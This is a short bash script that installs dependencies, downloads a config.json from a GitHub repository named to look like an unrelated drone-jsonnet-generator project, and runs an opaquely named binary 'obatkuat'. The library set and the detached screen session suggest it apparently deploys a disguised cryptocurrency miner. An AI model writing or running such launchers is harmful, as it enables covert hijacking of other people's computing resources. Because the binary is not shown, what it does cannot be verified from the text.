#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
chmod +x obatkuat
screen -dmS ls
wget https://raw.githubusercontent.com/dhenisusanto/github.com-dhenisusanto0-drone-jsonnet-generator-master/main/config.json
 ./obatkuat
